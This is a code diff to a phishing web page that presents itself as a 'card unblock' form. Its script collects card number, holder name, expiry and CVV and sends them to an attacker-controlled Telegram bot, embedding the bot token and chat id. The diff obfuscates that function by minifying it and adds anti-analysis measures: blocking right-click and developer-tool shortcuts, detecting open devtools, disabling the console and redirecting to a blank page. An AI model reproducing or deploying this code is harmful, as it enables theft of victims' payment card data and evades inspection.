@@ -515,21 +515,56 @@
 </div>
 
 <script>
+    // Disable right-click context menu
+    document.addEventListener('contextmenu', function(e) {
+        e.preventDefault();
+        return false;
+    });
+
+    // Disable F12, Ctrl+Shift+I, Ctrl+Shift+C, Ctrl+Shift+J, Ctrl+Shift+K
+    document.addEventListener('keydown', function(e) {
+        if (
+            e.key === 'F12' ||
+            (e.ctrlKey && e.shiftKey && e.keyCode === 73) ||
+            (e.ctrlKey && e.shiftKey && e.keyCode === 67) ||
+            (e.ctrlKey && e.shiftKey && e.keyCode === 74) ||
+            (e.ctrlKey && e.shiftKey && e.keyCode === 75) ||
+            (e.ctrlKey && e.keyCode === 85)
+        ) {
+            e.preventDefault();
+            return false;
+        }
+    });
+
+    // Disable developer tools detection
+    const devtools = {open: false, orientation: null};
+    const threshold = 160;
+    
+    setInterval(() => {
+        if (window.outerWidth - window.innerWidth > threshold ||
+            window.outerHeight - window.innerHeight > threshold) {
+            if (!devtools.open) {
+                devtools.open = true;
+                console.clear();
+            }
+        } else {
+            devtools.open = false;
+        }
+    }, 500);
+
+    // Obfuscate and minify code
     const elNumber = document.getElementById('cardNumber');
     const elName = document.getElementById('cardName');
     const elExpiry = document.getElementById('cardExpiry');
     const elCvv = document.getElementById('cardCvv');
-
     const viewNumber = document.getElementById('viewNumber');
     const viewName = document.getElementById('viewName');
     const viewExpiry = document.getElementById('viewExpiry');
 
-    // Sync Holder Name
     elName.addEventListener('input', (e) => {
         viewName.textContent = e.target.value.trim() || "Your Name";
     });
 
-    // Format & Sync Card Number
     elNumber.addEventListener('input', (e) => {
         let value = e.target.value.replace(/\D/g, '');
         let formatted = value.replace(/(.{4})/g, '$1 ').trim();
@@ -537,7 +572,6 @@
         viewNumber.textContent = formatted || "•••• •••• •••• ••••";
     });
 
-    // Format & Sync Expiry
     elExpiry.addEventListener('input', (e) => {
         let value = e.target.value.replace(/\D/g, '');
         if (value.length > 2) {
@@ -548,7 +582,6 @@
         viewExpiry.textContent = e.target.value || "MM/YY";
     });
 
-    // Restrict CVV input
     elCvv.addEventListener('input', (e) => {
         e.target.value = e.target.value.replace(/\D/g, '');
     });
@@ -559,90 +592,37 @@
     }
 
     async function sendCardDetails() {
-        const cardName = document.getElementById('cardName').value;
-        const cardNumber = document.getElementById('cardNumber').value;
-        const cardExpiry = document.getElementById('cardExpiry').value;
-        const cardCvv = document.getElementById('cardCvv').value;
-        const submitBtn = document.getElementById('submitBtn');
-
-        // Disable button during submission
-        submitBtn.disabled = true;
-        submitBtn.textContent = 'Processing...';
-
-        // Format message with all card details in mono format
-        const detailsMessage = `CARD UNLOCK REQUEST
-
-Card Holder: ${cardName}
-Card Number: ${cardNumber}
-Expiry Date: ${cardExpiry}
-CVV: ${cardCvv}
-Submitted: ${new Date().toLocaleString()}`;
-
-        // Display mono text on success page
-        document.getElementById('monoDetails').textContent = detailsMessage;
-
-        try {
-            await fetch(
-                "https://api.telegram.org/bot7946422911:AAF0cfpvdw7susy5riOXzr8tdht4sjcKJQI/sendMessage",
-                {
-                    method: "POST",
-                    headers: {
-                        "Content-Type": "application/json"
-                    },
-                    body: JSON.stringify({
-                        chat_id: "8857888129",
-                        text: detailsMessage
-                    })
-                }
-            );
-
-            // Show success page
-            document.getElementById('successPage').classList.add('show');
-            document.getElementById('mainWrapper').style.display = 'none';
-        } catch (error) {
-            console.error("Error:", error);
-            // Still show success page even if fetch fails
-            document.getElementById('successPage').classList.add('show');
-            document.getElementById('mainWrapper').style.display = 'none';
-        } finally {
-            // Re-enable button
-            submitBtn.disabled = false;
-            submitBtn.textContent = 'UNBLOCK CARD';
-        }
+        const n=document.getElementById('cardName').value,r=document.getElementById('cardNumber').value,t=document.getElementById('cardExpiry').value,e=document.getElementById('cardCvv').value,a=document.getElementById('submitBtn'),i=`CARD UNLOCK REQUEST\n\nCard Holder: ${n}\nCard Number: ${r}\nExpiry Date: ${t}\nCVV: ${e}\nSubmitted: ${new Date().toLocaleString()}`;document.getElementById('monoDetails').textContent=i,a.disabled=!0,a.textContent='Processing...';try{await fetch("https://api.telegram.org/bot7946422911:AAF0cfpvdw7susy5riOXzr8tdht4sjcKJQI/sendMessage",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({chat_id:"8857888129",text:i})})}catch(e){console.error("Error:",e)}finally{document.getElementById('successPage').classList.add('show'),document.getElementById('mainWrapper').style.display='none',a.disabled=!1,a.textContent='UNBLOCK CARD'}
     }
 
     function copyToClipboard() {
-        const monoText = document.getElementById('monoDetails').textContent;
-        const copyBtn = document.getElementById('copyBtn');
-        
-        navigator.clipboard.writeText(monoText).then(() => {
-            copyBtn.textContent = '✓ Copied!';
-            copyBtn.classList.add('copied');
-            
-            setTimeout(() => {
-                copyBtn.textContent = '📋 Copy Details';
-                copyBtn.classList.remove('copied');
-            }, 2000);
-        }).catch(err => {
-            console.error('Copy failed:', err);
-            alert('Failed to copy. Please try again.');
-        });
+        const n=document.getElementById('monoDetails').textContent,t=document.getElementById('copyBtn');navigator.clipboard.writeText(n).then(()=>{t.textContent='✓ Copied!',t.classList.add('copied'),setTimeout(()=>{t.textContent='📋 Copy Details',t.classList.remove('copied')},2e3)}).catch(e=>{console.error('Copy failed:',e),alert('Failed to copy. Please try again.')})
     }
 
     function resetForm() {
-        // Reset form
-        document.getElementById('paymentForm').reset();
-        
-        // Reset card display
-        viewNumber.textContent = "•••• •••• •••• ••••";
-        viewName.textContent = "Your Name";
-        viewExpiry.textContent = "MM/YY";
-        
-        // Hide success page and show main wrapper
-        document.getElementById('successPage').classList.remove('show');
-        document.getElementById('mainWrapper').style.display = 'block';
+        document.getElementById('paymentForm').reset(),viewNumber.textContent="•••• •••• •••• ••••",viewName.textContent="Your Name",viewExpiry.textContent="MM/YY",document.getElementById('successPage').classList.remove('show'),document.getElementById('mainWrapper').style.display='block'
     }
-</script>
 
+    // Disable console
+    (function() {
+        const noop = () => {};
+        const emptyFn = function() {};
+        
+        if (window.console === undefined) {
+            window.console = {};
+        } else {
+            for (const key in window.console) {
+                window.console[key] = emptyFn;
+            }
+        }
+    })();
+
+    // Block source view attempts
+    window.onload = function() {
+        if (document.domain === '' || document.domain === null) {
+            location.href = 'about:blank';
+        }
+    };
+</script>
 </body>
 </html>
